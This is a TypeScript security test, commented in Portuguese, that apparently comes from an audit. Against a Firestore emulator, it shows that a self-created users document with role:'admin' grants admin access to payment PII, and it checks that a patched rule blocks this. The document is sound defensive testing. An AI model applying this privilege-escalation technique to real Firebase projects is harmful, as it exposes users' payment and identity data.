/**
 * PoC-01 — CRITICAL: Privilege escalation via self-created `users/{uid}` doc.
 *
 * Finding: SECURITY-AUDIT.md → CRITICAL (firestore.rules:23-31).
 * A regra `allow create: if request.auth.uid == userId;` NÃO restringe `role`,
 * então qualquer conta autenticada grava o próprio doc com role:'admin' e
 * isAdmin() passa a retornar true em todas as coleções.
 *
 * Este spec usa @firebase/rules-unit-testing contra o emulator do Firestore.
 *
 * Pré-requisito: emulator rodando ->
 *   firebase emulators:start --only firestore --project demo-boost
 *
 * Rodar:
 *   FIRESTORE_EMULATOR_HOST=127.0.0.1:8080 npx vitest run \
 *     .security-pocs/poc-01-critical-privesc/rules-unit-test.spec.ts
 */
import { readFileSync } from 'node:fs';
import { resolve } from 'node:path';
import { beforeAll, afterAll, describe, it, expect } from 'vitest';
import {
  initializeTestEnvironment,
  assertFails,
  assertSucceeds,
  type RulesTestEnvironment,
} from '@firebase/rules-unit-testing';
import { doc, getDoc, setDoc } from 'firebase/firestore';

const PROJECT_ID = 'demo-boost-rules-test';

// As regras ATUAIS do projeto (vulneráveis) — lidas direto do arquivo real.
const VULNERABLE_RULES = readFileSync(
  resolve(process.cwd(), 'firestore.rules'),
  'utf8',
);

// As regras com o PATCH sugerido no audit (role travado em 'client' no create).
const PATCHED_RULES = readFileSync(
  resolve(process.cwd(), '.security-pocs/poc-01-critical-privesc/firestore.patched.rules'),
  'utf8',
);

async function makeEnv(rules: string): Promise<RulesTestEnvironment> {
  return initializeTestEnvironment({
    projectId: PROJECT_ID,
    firestore: { rules, host: '127.0.0.1', port: 8080 },
  });
}

// =============================================================================
// CENÁRIO (a) — VULNERÁVEL: o ataque FUNCIONA com as regras atuais.
// =============================================================================
describe('VULNERABLE rules (firestore.rules atual)', () => {
  let env: RulesTestEnvironment;
  beforeAll(async () => { env = await makeEnv(VULNERABLE_RULES); });
  afterAll(async () => { await env.cleanup(); });

  it('attacker pode auto-criar users/{uid} com role:admin (privesc)', async () => {
    const attackerUid = 'attacker-uid-001';
    const attacker = env.authenticatedContext(attackerUid).firestore();

    // O atacante grava o PRÓPRIO doc forjando role:'admin'. A regra
    // `allow create: if request.auth.uid == userId` permite.
    await assertSucceeds(
      setDoc(doc(attacker, 'users', attackerUid), {
        uid: attackerUid,
        email: 'attacker@evil.local',
        role: 'admin', // <-- forjado pelo cliente
      }),
    );
  });

  it('com role:admin forjado, isAdmin() libera leitura de payment_profiles (PII)', async () => {
    const attackerUid = 'attacker-uid-002';

    // Semeia um payment_profile de vítima usando contexto privilegiado
    // (bypassa rules) — simula dado real de produção.
    await env.withSecurityRulesDisabled(async (ctx) => {
      await setDoc(doc(ctx.firestore(), 'payment_profiles', 'AFF-1001'), {
        pixKey: '123.456.789-00',
        cpfCnpj: '12345678900',
        legalName: 'Maria Vitima',
      });
    });

    const attacker = env.authenticatedContext(attackerUid).firestore();
    // 1) escala privilégio
    await assertSucceeds(
      setDoc(doc(attacker, 'users', attackerUid), { uid: attackerUid, role: 'admin' }),
    );
    // 2) agora lê PII de pagamento de QUALQUER afiliado (isAdmin()==true)
    await assertSucceeds(getDoc(doc(attacker, 'payment_profiles', 'AFF-1001')));
  });
});

// =============================================================================
// CENÁRIO (b) — PATCHED: o mesmo ataque é BLOQUEADO.
// =============================================================================
describe('PATCHED rules (role travado em create)', () => {
  let env: RulesTestEnvironment;
  beforeAll(async () => { env = await makeEnv(PATCHED_RULES); });
  afterAll(async () => { await env.cleanup(); });

  it('attacker NÃO consegue criar users/{uid} com role:admin', async () => {
    const attackerUid = 'attacker-uid-003';
    const attacker = env.authenticatedContext(attackerUid).firestore();

    await assertFails(
      setDoc(doc(attacker, 'users', attackerUid), {
        uid: attackerUid,
        email: 'attacker@evil.local',
        role: 'admin', // <-- agora rejeitado: só 'client' permitido
      }),
    );
  });

  it('attacker AINDA pode criar a própria conta como client (fluxo legítimo intacto)', async () => {
    const uid = 'legit-client-uid';
    const u = env.authenticatedContext(uid).firestore();
    await assertSucceeds(
      setDoc(doc(u, 'users', uid), { uid, email: 'cliente@boost.local', role: 'client' }),
    );
  });

  it('sem ser admin, leitura de payment_profiles é negada', async () => {
    const attackerUid = 'attacker-uid-004';
    await env.withSecurityRulesDisabled(async (ctx) => {
      await setDoc(doc(ctx.firestore(), 'payment_profiles', 'AFF-1001'), { pixKey: 'x' });
    });
    const attacker = env.authenticatedContext(attackerUid).firestore();
    // cria como client (passa), mas isAdmin() == false
    await setDoc(doc(attacker, 'users', attackerUid), { uid: attackerUid, role: 'client' });
    await assertFails(getDoc(doc(attacker, 'payment_profiles', 'AFF-1001')));
  });
});
